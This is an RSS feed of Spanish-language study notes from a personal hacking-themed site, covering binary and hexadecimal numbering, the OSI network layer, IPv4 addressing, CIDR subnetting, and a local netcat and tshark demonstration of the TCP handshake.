<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Hacking]]></title><description><![CDATA[Obsidian digital garden]]></description><link>https://dobliuw.com/</link><image><url>https://dobliuw.com/lib/media/favicon.png</url><title>Hacking</title><link>https://dobliuw.com/</link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Thu, 31 Oct 2024 17:33:45 GMT</lastBuildDate><atom:link href="https://dobliuw.com/lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Thu, 31 Oct 2024 17:29:41 GMT</pubDate><copyright><![CDATA[Dobliuw]]></copyright><ttl>60</ttl><dc:creator>Dobliuw</dc:creator><item><title><![CDATA[Byte and Bits]]></title><description><![CDATA[ 
 <br><br>Cuando nos referimos a bits, estamos hablando de la únidad más básica de información en un sistema informático, representando los valores 0 o 1. <br>Por otro lado, cuando nos referimos a un byte, estamos haciendo referencia a *una agrupación de 8 bits*. <br><br><br>Ahora bien, el Sistema Binario es un sistema de numeración en base 2, lo que significa que cada dígito puede ser solo 0 o 1. Es el sistema utilizado por las computadoras para representar los datos internamente, ya sean colores, números, letrasa, prixeles, etc. Cada posición en un número binario representa una potencia de 2, similar a cómo cada posición de un número decimal representa una potencia de 10.<br>En un número binario, cada bit tiene un peso específico basado en su posición. Emepezando desde la derecha, el primer bit tiene un peso de 2^0 (=1), el siguiente bit tiene un peso de 2^1 (=2), el sigueinte 2^2 (=4) y así sucesivamente. Es decir que para un conjunto de 4 bits (Denominado por lo general nibble) los pesos son (De derecha a izquierda) 0 1 2 4 8. <br>Entonces, con un nibble (4 bits) podemos representar un total de 2^4 (=16) posibilidades, que van desde el 0 al 15. A continuación veremos una tabla la cual nos ayudará a visualizar de una mejor manera esto, es importante tener en cuenta que para entender esta tabla hay que poder contar en números binarios, y para eso hay que entender como.....<br>Para contar en binario, comenzamos de derecha a izquierda. Siempre que nos encontramos un 0, lo convertimos en 1. Si encontramos un 1, lo convertimos en 0 y llevamos el 1 a la siguiente posición a la izquierda. Is esa posición también es 1, repetimos el proceso<br><br>De manera matemática, podríamos entender que se múltiplica el 1 o el 0 correspondiente al lugar del peso para posteriormente sumarse entre si, siendo el número binario 1010 por ejemplo:<br><br>De una manera más gráfica:<br><img alt="understanding_matematic_method_binary_system.png" src="https://dobliuw.com/lib/media/understanding_matematic_method_binary_system.png">]]></description><link>https://dobliuw.com/notes/0.-needed-concepts/systems/0.-binary.html</link><guid isPermaLink="false">Notes/0. Needed Concepts/Systems/0. Binary.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 26 Sep 2024 15:22:11 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/understanding_matematic_method_binary_system.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/understanding_matematic_method_binary_system.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Hexadecimal System:]]></title><description><![CDATA[ 
 <br><br>Habiendo entendido el sistema binario, podemos ver que se vuelve complejo manejar y representar números binarios larogs. Para simplificar esto, se creo y desde entonces utilizá el sistema hexadecimal.<br>El sistema hexadecimal es un sistema de numeración en base 16. Utiliza 16 símbolos, los cuales son números del 0 al 9 y letras de la A a la F. Este sistema es ampliamente utilizando debido a su eficiencia y facilidad para representar números binarios.<br>En el sistema hexadecimal, cada dígito representa 4 bits. Por lo tanto, podemos usar un solo dígito hexadecimal para representar un nibble completo:<br><br>De esta manera, si tuviéramos 1 byte (8 bits), representando las 256 posibilidades existentes (2^8), sería más fácil manejar las representaciones en el sistema hexadecimal. en lugar de tener un binario de 8 dígitos (11111111 par 255), tendríamos dos caracteres, FF.<br><br>Pero en cambio, si hariamos uso del sistema hexadecimal, podriamos separar los neddles (4 bits), dejandonos como resultado simplemente 2 caracteres para la representación de las 256 posibilidades existentes con 4 bits, por lo que en lugar de tener un binario de 8 digitos (11111111 para 255), tendríamos dos caracteres, como FF. <br><br>Con tener en la mente la sucesión, es decir que va del 0 al 9 y luego de la A a la F, simplemente cuando lleguemos a la F, volveremos a empezar la sucesión incrementando el primer caracter de izquierda a derecha, tambien siguiendo la sucesión, lo que nos dejará el rango del 00 al FF. ]]></description><link>https://dobliuw.com/notes/0.-needed-concepts/systems/1.-hexadecimal.html</link><guid isPermaLink="false">Notes/0. Needed Concepts/Systems/1. Hexadecimal.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 26 Sep 2024 15:19:54 GMT</pubDate></item><item><title><![CDATA[1. Network Layer - OSI]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:redes" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#redes</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:redes" class="tag" target="_blank" rel="noopener nofollow">#redes</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> 
<br><br><br>La Capa de Red / Network Layer (Capa 3) del <a data-href="Modelo OSI - OSI Model" href="https://dobliuw.com/Modelo OSI - OSI Model" class="internal-link" target="_self" rel="noopener nofollow">Modelo OSI - OSI Model</a> controla el intercambio de paquetes de datos, ya que estos no pueden enrutarse directamente al receptor y, por lo tanto, deben contar con nodos de enrutamiento. Luego, los paquetes de datos se transfieren de un nodo a otro hasta que alcanzan su destino. Para implementar esto, la capa de red identifica los nodos de red individuales y el control del flujo de datos. Al enviar los paquetes, se evalúan las direcciones y los datos se enrutan a través de la red de un nodo a otro. Normalmente no se procesan los datos en las capas superiores a L3 en los nodos. En base a las direcciones se realiza el enrutamiento y la construcción de tablas de enrutamiento.<br>Basicamente, la capa de red es responsable de las siguientes funciones:<br>
<br>Logical Addressing / Direccionamiento lógico.
<br>Routing / Ruteo.
<br>Los protocolos de definen en cada capa del <a data-href="Modelo OSI - OSI Model" href="https://dobliuw.com/Modelo OSI - OSI Model" class="internal-link" target="_self" rel="noopener nofollow">Modelo OSI - OSI Model</a>, y estos protocolos representan una coleccion de reglas para la comunicación respectiva en la capa. Son transparentes para los protocolos de las capas superiores o inferiores. Algunos protocolos cumplen tareas de varias capas y se extienden a dos o más capas. Los protocolos más utilizados en esta capa son:<br>
<br>IPv4 / IPv6
<br>IPsec
<br>ICMP
<br>IGMP
<br>RIP
<br>OSPF
<br>Garantizan el enrutamiento de paquetes desde el origen al destino dentro o fuera de una subred. Estas dos subredes pueden tener diferentes esquemas de direccionamiento o tipos de direccionamiento incompatibles. En ambos casos la transmisión de datos recorre en cada caso toda la red de comunicación e incluye un enrutamiento entre los nodos de la red. Dado que la comunicacioón directa entre el remitente y el receptor no siempre es posible debido a las diferentes subredes, los paquetes deben reenviarse desde nodos (enrutadores) que se encuentran en el camino. Los paquetes reenviados no llegan a las capas superiores, sino que se les asigna un nuevo destino intermedio y se envían al siguiente nodo.<br>
ok]]></description><link>https://dobliuw.com/notes/2.-networks/basic/redes/3.-addressing/1.-network-layer-osi.html</link><guid isPermaLink="false">Notes/2. Networks/Basic/Redes/3. Addressing/1. Network Layer - OSI.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 10 Jan 2024 14:55:47 GMT</pubDate></item><item><title><![CDATA[2. IPv4 Addresses - Direcciones IPv4]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:redes" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#redes</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:redes" class="tag" target="_blank" rel="noopener nofollow">#redes</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> 
<br><br><br>Cada host ubicado en la red puede identificarse mediante la llamada dirección de control de acceso al medio (Media Access Control address | MAC). Estp permitiría el intercambio de datos dentro de esta única red. Si el host remoto está ubicado en otra red, conocer la dirección MAC no es suficiente para establecer una conexión. El direccionamiento en internet se realiza a través de la dirección IPv4 y/o IPv6, ques e compone de la dirección de red y la dirección del host.<br>No importa si se trata de una red más pequeña, como una red informática doméstica, o toda Internet. La dirección IP garantiza la entrega de datos al receptor correcto. Podemos imaginar la representación de las direcciones  MAC e IPv4/IPv6 de la siguiente manera:<br>
<br>IPv4/IPv6: Etiqueta numérica que identifica de manera lógica y jerárquica a una interfaz conectarda a la red.
<br>MAC: Identificador de 48 bits que corresponde de forma única a una tarjeta o dispositivo de red.
<br>Es posible que una dirección IP se dirija a múltiples receptores (broadcasting) o que un dispositivo responda a múltiples direccionesIP. Sin embargo se debe grarantizar que cada dirección IP se asigne solo una vez dentro de la red.<br><br>El método más común de asignación de direcciones IP es IPv4, el cual consta en un número binario de 32-bits combinado en 4 bytes que consta de grupos de 8 bits (Octets) que van del 0 al 255. Estos se convierten en números decimales más fáciles de leer, separados por puntos y representados como notación decimal con puntos.<br>Una dirección IPv4 puede verse así: <br>
<br>Binary:  0111 1111 . 0000 0000 . 0000 0000 . 0000 0001
<br>Decimal: 127.0.0.1
<br>A cada interfaz de red (Tarjetas de red, impresoras de red o routers) se le asigna una dirección IP única.<br>El formato IPv4 permite 4.294.967.296 direcciones únicas. La dirección IP se divide en una parte de host y una parte de red. El router asigna la parte del host de la dirección IP en casa o mediante un administrador. El administrador de red respectivo asigna la parte de red. En Internet, es la IANA, que asigna y gestiona las IP únicas.<br>En el pasado se realizaban aquí otras clasificaciones. Los blqoues de red IP se dividieron en clases A - E. Las diferentes clases diferían en las longitudes respectivas de los recursos compartidos de red y host. <br><img alt="network_clases.png" src="https://dobliuw.com/lib/media/network_clases.png"><br><br>Una mayor separación de estas clases en redes pequeñas se realiza con la ayuda de subneting/subredes. Esta  separación se realiza mediante netmasks/máscaras de red, que son tan largas como una dirección IPv4. Al igual que con las clases, describe qué posiciones de bits dentro de la dirección IP actúan como parte de la red o parte del host.<br><img alt="subnetmask.png" src="https://dobliuw.com/lib/media/subnetmask.png"><br><br>Las dos IP adicionales agregadas en la columna IPs están reservadas para la llamada dirección de red/network address y la dirección de transmisión/broadcast address. Otro papel importante juega la puerta de enlace predeterminada (Default Gateway), que es el nombre de la dirección IPv4 del router que conecta redes y sistemas con diferentes protocolos y administra direcciones y métodos de tranmisión. Es común que a la default gateway se le asigne la primera o la última dirección IPv4 asignable en una subred. Eso no es un requisito técnico, pero se ha convertido en un estándar de facto en entornos de red de todos los tamaños.<br><img alt="first_addresses_table.png" src="https://dobliuw.com/lib/media/first_addresses_table.png"><br><br>La tarea de la dirección broadcast IP es conectar todos los dispositivos en una red entre sí. Difusión en una red es un mensaje que se transmite a todos los participantes de una red y no requiere ninugna respuestsa. De esta manera, un host envía un paquete de datos a todos los demás participantes de la red simultáneamente y, al hacerlo, comunica su dirección IP, que los receptores pueden utilizar para contactar con él. Esta es la última dirección IPv4 que se utiliza para la transmisión. <br><img alt="last_addresses_table.png" src="https://dobliuw.com/lib/media/last_addresses_table.png"><br><br><br>El sistema binario es un sistema de númerico que utiliza sólo dos estados diferentes representados por dos números (0 y 1) opuestos al sistema decimal (0 al 9).<br>Una dirección IPv4 se divide en 4 octetos, como ya se ha mencionado. cada octeto consta de 8 bits. Cada posición de un bit en un octeto tiene un varlo decimal específico. tomemtos como ejemplo la siguiente dirección IPv4:<br>
<br>Dirección IPv4: 192.168.10.39
<br>El primer octeto de esta dirección IPv4 sería: <br>
<br>Valores:      128     64     32     16     8      4      2     1
<br>Binario:        1       1       0      0      0      0      0      0
<br>Si calculamos la suma de todos estos valores de cada octeto donde existe el bit 1, veríamos la IP: <br>
<br>
1er Octeto: 

<br>Valores:   128     64     32     16     8      4      2     1
<br>Binario:     1       1       0      0      0      0      0      0

<br>Suma: 192




<br>
2do Octeto: 

<br>Valores:   128     64     32     16     8      4      2     1
<br>Binario:     1       0        1      0      0      0      0      0

<br>Suma: 168




<br>
3er Octeto: 

<br>Valores:   128     64     32     16     8      4      2     1
<br>Binario:     0       0       0      0      1      0      1      0

<br>Suma: 10




<br>
4to Octeto: 

<br>Valores:   128     64     32     16     8      4      2     1
<br>Binario:     0       0       1      0      0      1      1      1

<br>Suma: 39




<br>
IP Final: 192.168.10.39

<br><br>Clases Inter-Domain Routing / Enrutamiento entre dominios sin clases (CIDR) es un método de representacipon y reemplaza la asignación fija entre la dirección IPv4 y las calses de red (A, B, C, D, E). La división se basa en la máscara de subred o el llamado sufijo CIDR/CIRD suffix, que permite la división bit a bit del espacio de direcciones IPv4 y, por lo tanto, en subredes de cualquier tamaño. El sufijo CIDR indica cuántos bits desde el principio de la dirección IPv4 pertenecen a la red. Es una notación que representa la subnet mask/máscara de subred especificando el número de 1 bit en la máscara de subred.<br>Por ejemplo, con la siguiente dirección IPv4 y la Subnet Mask: <br>
<br>IPv4: 192.168.10.39
<br>Dirección Subnet Mask: 255.255.255.0
<br>Toda la representación de la IPv4 y la máscara de subred se vería así:<br>
<br>CIDR: 192.168.10.39/24
<br>Por lo tanto, el sufijo CIRD es la suma de todos los 1 en la máscara de subred.<br>
<br>
1er Octeto: 

<br>Values: 128    64     32     16      8      4        2       1   
<br>Binary:  1       1       1       1      1       1       1        1
<br>Decimal 255


<br>
2do Octeto: 

<br>Values: 128    64     32     16      8      4        2       1   
<br>Binary:  1       1       1       1      1       1       1        1
<br>Decimal 255


<br>
3er Octeto: 

<br>Values: 128    64     32     16      8      4        2       1   
<br>Binary:  1       1       1       1      1       1       1        1
<br>Decimal 255


<br>
4to Octeto: 

<br>Values: 128    64     32     16      8      4        2       1   
<br>Binary:  0       0       0       0      0      0        0       0
<br>Decimal 0


<br>
CIDR: 8*3 = 24<br>
Básicamente la suma de los 3 primeros bytes (Conjuntos de 8 bits), es decir, los tres primeros octetos completos (En este caso).

]]></description><link>https://dobliuw.com/notes/2.-networks/basic/redes/3.-addressing/2.-ipv4-addresses-direcciones-ipv4.html</link><guid isPermaLink="false">Notes/2. Networks/Basic/Redes/3. Addressing/2. IPv4 Addresses - Direcciones IPv4.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 16 Jan 2024 18:45:12 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/network_clases.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/network_clases.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[3. Subneting - Subredes]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:redes" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#redes</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:redes" class="tag" target="_blank" rel="noopener nofollow">#redes</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> 
<br>]]></description><link>https://dobliuw.com/notes/2.-networks/basic/redes/3.-addressing/3.-subneting-subredes.html</link><guid isPermaLink="false">Notes/2. Networks/Basic/Redes/3. Addressing/3. Subneting - Subredes.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 16 Jan 2024 18:47:09 GMT</pubDate></item><item><title><![CDATA[Basic Concepts]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:redes" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#redes</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:redes" class="tag" target="_blank" rel="noopener nofollow">#redes</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> 
<br><br><br>Una red permite a dos computadores comunicarse entre si. Existe una amplia gama de topologias (mesh / tree / star), medios (ethernet / fiber / coax / wireless) y protocolos ( TCP / UDP / IPX) que pueden ser utilizados para facilitar las conexiones. <br><img alt="basic_connection.png" src="https://dobliuw.com/lib/media/basic_connection.png"><br>Todo internet esta basado en muchas redes subdivididas, por ejemplo, en esta imagen tenemos por un lado la Home Network y por otro la Company Network. Supongamos que queremos visitar el servicio web de la compañia (Alojado en Company Network) desde nuestra red Home Network, nosotros sabemos la dirección del servicio web o más conocido como Uniform Resource Locator (URL) que ingresamos en nuestro navegador, también conocido como Fully Qualified Domain Name (FQDM).<br>
<br>URL (<a rel="noopener nofollow" class="external-link" href="https://www.hackthebox.eu/resource?query=xdata" target="_blank">https://www.hackthebox.eu/resource?query=xdata</a>): puede contener parametros que determinen una parte especifica de la página web.
<br>FQDN (<a data-tooltip-position="top" aria-label="http://www.hackthebox.eu" rel="noopener nofollow" class="external-link" href="http://www.hackthebox.eu" target="_blank">www.hackthebox.eu</a>): solo especifica la página web.
<br>En este simple ejemplo, la conexión comenzaria desde nuestro dispositivo localizado en Home Network el cual trámita una petición al servicio web de la compañia mediante nuestro router, el cual se conecta con nuestro ISP (Proveedor de serivcio de internet), el cual a su vez nos permite conectarnos a internet para realizar una petición a un servidor DNS, quien resuelve la url de la página web de la compañia solicitada a una dirección IP, la cual finalmente se utiliza para enviar nuestra petición a la máquina que hostea dicha página web. Una vez recibida la petición, la máquina que hostea la página web de la compañia hace uso del router de la Company Network para conectarse a su ISP y devolvernos la petición previamente realizada.<br><br><br>La direcciones IP son identificadores numéricos únicos que se utilizan para identificar dispositivos en una red, como pc's, routers, servidores y otros dispositivos. Existen dos versiones (v4 y v6).<br><br>Consiste en un formato de dirección de 32 bits y es la más utilizada, se le suele llamar "Octeto" a las unidades compuestas por 8 bits por lo que IPv4 consta de un total de 4 obtetos, ya que consta de 4 pares de 8 bits (32 en total). <br>Para ver los bits del primer octeto, es decir, representaod en numeros binarios el primer número antes del punto de la ip podriamos jugando con el comando: <br>echo "$(echo "obase=2; 192" | bc).168.1.38"
Copy<br> Ahora.... si tenemos en cuenta que hay 32 bits por cada IP, cual seria la cantidad de posibilidades de combinaciones unicas y diferentes de las demás?  Esto lo podriamos ver con el comando: <br>echo "2^32" | bc
Copy<br>Lo que nos devuelve "4294967296" , por lo que teniendo en cuenta que en el mundo hay 8.000.000.000+ personas, nos estamos quedando sin direcciones IPv4, por lo que se esta implementando las direcciones IPv6 con un formato asi: "2802:8010:4928:8e01:539b:104:abc6:2c7c", por lo que si vieramos la cantidad de posiblidades con echo "2^128" | bc veriamos un total de posibilidades unicas de "340282366920938463463374607431768211456" lo que resuelve el problema y deja casi anulada la posibilidad de quedarnos sin IP's.<br><br> Tambien conocida como IPng (Next Generation Internet Protocol), ha sido diseñada para solucionar el problema de asignacion de IP's limitada y para remplazar de forma gradual a las IPv4. Consta en un  formato de dirección de 128 bits, siendo 8 grupos de dígitos hexadecimales,  siendo a su vez cada uno de estos 8 grupos 2 octetos cada uno (16 bits), separados en este caso por un ":".  <br>Ejemplo de IPv6 2802:8010:4928:8e01:539b:104:abc6:2c7c. <br><br><br>La dirección MAC o dirección fisica, es un número en hexadecimal de 12 dígitos (Número binario de 6 bytes, es decir, 6 bloques de 8 bits), teniendo asi, la dirección MAC un total de 48 bits.  Esta dirección se utiliza para representar de manera "unica" cada dispositivo, una especie de DNI. En este caso hablamos de "unica" ya que existen herramientas como macchanger que te permiten alterar la misma. <br>La MAC consta de, en primer lugar (Los primeros 3 octetos), representan al OUI (Identificador Único Organizacional), es decir, que los 3 primeros octetos hacen alución a un número que identifica el fabricante del dispositivo, mientras que los ultimos 3 octetos representan al NIC (Network Interface Controler Especific) o  Modelo del dispositivo.<br><br><br>El protocolo TCP, es un protocolo orientado a dirección, es uno de los principales protocolos en redes TPC/IP, proporciona verificación de errores y se comprueba que los datos se hayan entregado, es decir, proporciona una entrega de datos confiable, mientras que UDP es un protocolo NO orientado a la conexión el cual manda constantemente datos sin verificar la integridad ni el recibimiento de los mismos, es decir NO garantiza la entrega de datos.  <br>Cuando hablamos del protocolo TCP es importante tener en cuenta una parte crucial de este, el cual es Three-Way Handshake, un procedimiento utilizado para establecer una conexión entre dos dispositivos. Este procedimiento consta de tres pasos 1. SYN, 2. SYN-ACK, 3. ACK, en los que se sincronizan los números de secuencia y de reconocimiento de los paquetes entre los dispositivos. Este procedimiento es fundamental para una conexión confiable y segura a través de TCP.<br><img alt="Pasted image 20230410072747.png" src="https://dobliuw.com/lib/media/pasted-image-20230410072747.png"><br>Y esto lo podemos ver de manera super clara, si nos abrimos el wireshark (Herramienta para analizar trafico de red con interfaz grafica) y nos ponemos en escucha el la interfaz "Loopback (lo)" o mismo desde tshark en escucha con el parametro -i con esta misma interfaz, e intentamos establecer una conexión con nosotros mismos podriamos ver esto. <br># Primero nos ponemos en escucha por el puerto 4646. 
sudo nc -nlvp 4646

# Ahora desde otra consola nos ponemos en con tshark a escuchar el trafico de la interfaz lo, o abrimos el wireshark y lo mismo. 
tshark -i lo 

wireshark &amp;&gt;/dev/null &amp; disown 

# Y por ultimo nos intentamos conectar mediante netcat a nuestra ip por el puerto 4646. 
nc {dirección_ip} 4646 
Copy<br>De esta manera veriamos este famoso Three-Way Handshake, el cual se tramiten 3 paquetes. <br>
<br>

<img alt="Pasted image 20230410073756.png" src="https://dobliuw.com/lib/media/pasted-image-20230410073756.png">

<br>

<img alt="Pasted image 20230410073928.png" src="https://dobliuw.com/lib/media/pasted-image-20230410073928.png">

<br><br>TCP:<br>
<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>UDP: <br>
<br>


<br>


<br>


<br>


<br>


<br><br><br>
<br>


<br>Consiste en dividir una red en subredes. Hay que tener mucho cuidado para no desaprovechar direcciones IPv4.  Esto se logra mediante el use de máscaras de red, que permiten defini qué bits de la dirección IP corresponden a la red y cuáles a los hosts.<br>
<br>


<br>Para interpretar una máscara de red, se deben identificar los bits que están en 1. Estos bits representan la porción de la dirección IP que se corresponde a la red. Por ejemplo, una máscara de red de 255.255.255.0 indica que los primeros tres octetos de la dirección IP corresponden a la red, mientras que el último octeto se utiliza para identificar los hosts.<br>Cuando hablamos de CIDR (Classless Inter-Domain Routing), a lo que nos referimos es a un método de asignación de direcciones IP más eficiente y flexible que el uso de clases de reded IP fijas, Con CIDR, una dirección IP se representa mediante una dirección IP base y una máscara de red, que se escriben juntas separadas por una "/".<br>
Por ejemplo, la dirección IP 192.168.1.38 con una máscara de red de 255.255.255.0 se escribiría como 192.168.1.38/24<br>La máscara de red se representa en notación de prefijo, que indica el número de bits que están en "1" en la máscara. En este caso, la máscara de red 255.255.255.0 tiene 24 bits en "1" (Los primeros tres octetos), por lo que su notación de prefijo es /24.<br>Para calcular la máscara de red a partir de una notación de prefijo, se deben escribir los bits "1" en los primeros bits de una direccion IP de 32 bits y los bits "0" en los bits restantes. Por ejemplo, la máscara de red /24 se calcularía como 11111111.11111111.11111111.00000000 en binario, lo que equivale a 255.255.255.0 en decimal.<br>Esto se podria representar en una excel, en donde empezando a partir de los 128 bits, vamos partiendo a la mitad hasta llegar al 1, cuatro veces.<br>
El resultado de 255 es la operatoria de la suma de la multiplicación que tiene el 128 * el 1 o el 0, dependiendo en que este.<br>De manera que el primer resultado seria en excel la siguiente operatoria:<br><br><img alt="Pasted image 20230410101337.png" src="https://dobliuw.com/lib/media/pasted-image-20230410101337.png"><br>Mientras que el valor de /24 sale de la operatoria de contar cuantos valores estan en 1.  En excel, la sig. operatoria:<br><br>En cuanto a clases de direcciones IP, existen tres tipos de máscaras de red: Clase A, Clase B y Clase C.<br>
<br>


<br><br>
<br>


<br><br>
<br>


<br><br>Es importante tener en cuenta que, además de estos tres tipos de máscaras de red, también existen máscaras de red personalizadas que se pueden utilizar para crear subredes de diferentes tamaños de una red. Recordemos que los CIDRs son un método de asignación de direcciones IP que permite dividir una dirección IP en una parte que identifica la red y otra parte que identifica el host. Esto se logra mediante el uso de una máscara de red, que se representa en notación CIDR como una dirección IP base seguida de un número que indica la cantidad de bits que corresponden a la red.<br>
De esta manera se puede facilitar la administración de red y la desperdiciación de IP's. <br>De esta manera, como atacante, basandonos en la máscara de red, o mismo desde una ip,  podriamos empezar a conseguir la netmask, el total de hosts a repartir, el network ID y la broadcast address. <br>Esto lo podriamos hacer en base a nuestro anterior excel sumado a uno nuevo: <br><img alt="Pasted image 20230410112448.png" src="https://dobliuw.com/lib/media/pasted-image-20230410112448.png"><br>En base a esta configuración podriamos ir modificando los distintos valores de bits viendo por un lado como se afectaria la netmask, ya que, en este ejemplo, tenemos las 3 primeras tablas todas con el valor del bit en "1" mientras que la ultima todo en "0", dejando asi una netmask de 255.255.255.0 con un total de 256 hosts posibles a signar y un prefijo de /24, por lo que sabemos que esto seria una netmask de Clase C y en base a la ip podriamos averiguar tanto el Network ID como la Broadcast adress, ya que sabemos que la primera IP dentro de las 256 posibles (En este caso) pertenecen al Network ID, y la ultima a la Broadcast Address.<br><img alt="MacheteNetmask.png" src="https://dobliuw.com/lib/media/machetenetmask.png"><br>En esta imagen tenemos un pequeño "machete", en donde podemos ver rapidamente las clases de las netmask, junto a el valor x donde se cambiaria por el valor de la columna roja asi como tambien dependiendo el prefix "/x" cuantos hosts disponibles tendriamos. Pero para llegar a esto se lo hace con las sigs. formulas: <br>
<br>


<br>La dirección IP que se nos da, supongamos "192.168.1.0/26", tiene los primeros 26 bits de la dirección IP que corresponden a la red y los últimos 6 bits (Recordemos que maximo son 32, es decir 4 bloques de 8bits) corresponden a los hosts.<br>
Para calcular la máscara de red, necesitamos colocar los primeros 26 bits en 1 y los útimos 6 en 0: <br>
<br>


<br>El valor de los primeros 24 bits (Los primeros 3 bloques) son todos de 1, lo que significa que el valor decimal de cada uno de los octetos es de 255, ya que si tenemos en cuenta que el valor de cada bloque es de 255 devido a lo sig: <br><img alt="Pasted image 20230410113952.png" src="https://dobliuw.com/lib/media/pasted-image-20230410113952.png"><br>El ultimo octeto tiene los útimos 6 bits en 0, lo que significa que su valor decimal es 192 devido a lo sig: <br><img alt="BITS_De_Un_Byte.png" src="https://dobliuw.com/lib/media/bits_de_un_byte.png"><br>Por lo tanto, la máscara de red es 255.255.255.192. <br>
<br>


<br>En este caso, se pueden utilizar los 6 bits que quedan disponibles para representar la parte de hosts. En una máscara de red de 26 bits, los 6 bits restantes representan: <br>
<br>


<br>Lo que nos indica que tenemos un total de 62 hosts disponibles para asignar. La formula es de 2^(n) - 2, donde n es la cantidad de bits utilizados para representar la parte de hosts en la máscara de red y el -2 debido a el Network ID y la Broadcasta Address.<br>
<br>


<br>Para calcular el Network ID, lo que debemos hacer es aplicar la máscara de red a la dirección IP de la red. En este ejemplo, la máscara de red era 255.255.255.192, lo que significa que los primeros 26 bits de la dirección IP pertenecen a la parte de red.<br>
Entonces, para calcular la Network ID, convertiremos tanto la dirección IP como la máscara de red en binario y luego hacemos una operación "AND" lógica entre los dos. La operación "AND" compara los bits correspondientes en ambas direcciones y devuelve un resultado en el que todos los bits coincidentes son iguales a "1" y todos los bits no coincidentes son iguales a 0.<br>En este caso, la dirección IP es 192.168.1.0 en decimal y se convierte a binario en 11000000.10101000.00000001.00000000 y la máscara de red que es 255.255.255.192 en decimal se convierte en binario como 11111111.11111111.11111111.11000000. <br>Luego, aplicamos la operación "AND" entre estos dos valores binarios bit a bit. Los bits correspondientes en ambos valores se comparan de la sig manera: <br><img alt="ANDOperation.png" src="https://dobliuw.com/lib/media/andoperation.png"><br>En el caso de que haya dos 1 se convierte a 1, si no, a 0.  Y para convertir el valor de el binario a la dirección ip resultatnte como Network ID, podemos hacer lo sig: <br>
echo "$(echo "ibase=2; 11000000" | bc).$(echo "ibase=2; 10101000" | bc).$(echo "ibase=2; 00000001" | bc).$(echo "ibase=2; 00000000" | bc

# Esto devolveria 192.168.1.0
Copy<br>
<br>


